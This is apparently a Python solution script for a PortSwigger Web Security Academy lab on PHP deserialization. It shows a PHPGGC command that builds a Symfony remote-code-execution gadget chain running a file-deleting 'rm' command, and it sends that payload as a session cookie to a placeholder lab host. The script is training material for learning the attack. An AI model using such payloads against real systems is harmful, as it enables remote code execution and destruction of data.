"""
Lab 6: Exploiting PHP deserialization with a pre-built gadget chain
https://portswigger.net/web-security/deserialization/exploiting/lab-exploiting-php-deserialization-with-a-pre-built-gadget-chain
Difficulty: Practitioner

📝 PHPGGC equivalent of Lab 5 — see utils.PHPGGC_NOTE for setup. This app
uses a known framework (commonly Symfony's RCE4-style chain for this
specific lab) that PHPGGC already has a chain for.
"""

import base64

from utils import get_session, log, note, PHPGGC_NOTE

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
PAYLOAD_FILE = "payload.txt"  # output of the phpggc command below


def run():
    note(PHPGGC_NOTE)
    note("Typical command for this lab (framework/chain name varies by lab")
    note("instance — run `./phpggc -l` and look for Symfony/Laravel entries):")
    note("  ./phpggc symfony/rce4 exec 'rm /home/carlos/morale.txt' -b "
         "> payload.txt")

    try:
        with open(PAYLOAD_FILE, "r") as f:
            encoded = f.read().strip()
    except FileNotFoundError:
        log(f"{PAYLOAD_FILE} not found — generate it with phpggc first.", ok=False)
        return

    note(f"Loaded base64 payload ({len(encoded)} chars).")

    s = get_session()
    s.cookies.set("session", encoded)
    r = s.get(f"{TARGET}/")
    log(f"Status: {r.status_code}")
    print(r.text[-300:])


if __name__ == "__main__":
    run()
